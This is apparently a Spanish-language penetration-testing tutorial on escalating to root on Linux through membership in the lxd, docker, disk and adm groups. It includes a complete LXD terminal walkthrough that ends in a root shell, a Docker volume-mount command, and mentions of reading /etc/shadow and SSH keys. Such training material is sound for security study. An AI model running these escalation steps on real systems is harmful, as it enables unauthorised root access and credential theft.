## LXC / LXD

LXD es similar a Docker y es el administrador de contenedores de Ubuntu. Al instalarlo, todos los usuarios se agregan al grupo LXD. La pertenencia a este grupo puede ser utilizada para escalar privilegios creando un contenedor LXD, haciéndolo privilegiado y luego accediendo al sistema de archivos del host en `/mnt/root`. Confirmemos la pertenencia al grupo y usemos estos derechos para escalar a root.

```r
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Descomprime la imagen de Alpine.

```r
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Inicia el proceso de inicialización de LXD. Elige los valores predeterminados para cada solicitud. Consulta este [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) para más información sobre cada paso.

```r
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Importa la imagen local.

```r
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Inicia un contenedor privilegiado con `security.privileged` establecido en `true` para ejecutar el contenedor sin un mapeo de UID, haciendo que el usuario root en el contenedor sea el mismo que el usuario root en el host.

```r
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Monta el sistema de archivos del host.

```r
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Finalmente, abre una shell dentro de la instancia del contenedor. Ahora podemos navegar por el sistema de archivos montado del host como root. Por ejemplo, para acceder al contenido del directorio root en el host escribe `cd /mnt/root/root`. Desde aquí podemos leer archivos sensibles como `/etc/shadow` y obtener hashes de contraseñas o acceder a las claves SSH para conectarnos al sistema host como root, y más.

```r
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

---

## Docker

Colocar a un usuario en el grupo docker es esencialmente equivalente a acceso a nivel root al sistema de archivos sin requerir una contraseña. Los miembros del grupo docker pueden iniciar nuevos contenedores docker. Un ejemplo sería ejecutar el comando `docker run -v /root:/mnt -it ubuntu`. Este comando crea una nueva instancia de Docker con el directorio /root del sistema de archivos del host montado como un volumen. Una vez iniciado el contenedor, podemos navegar al directorio montado y recuperar o agregar claves SSH para el usuario root. Esto podría hacerse para otros directorios como `/etc` que podrían usarse para recuperar el contenido del archivo `/etc/shadow` para cracking de contraseñas offline o agregar un usuario privilegiado.

---

## Disk

Los usuarios dentro del grupo disk tienen acceso completo a cualquier dispositivo contenido dentro de `/dev`, como `/dev/sda1`, que es típicamente el dispositivo principal utilizado por el sistema operativo. Un atacante con estos privilegios puede usar `debugfs` para acceder a todo el sistema de archivos con privilegios de root. Al igual que con el ejemplo del grupo Docker, esto podría aprovecharse para recuperar claves SSH, credenciales o agregar un usuario.

---

## ADM

Los miembros del grupo adm pueden leer todos los registros almacenados en `/var/log`. Esto no otorga acceso directo a root, pero podría aprovecharse para recopilar datos sensibles almacenados en archivos de registro o enumerar acciones de usuarios y trabajos cron en ejecución.

```r
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```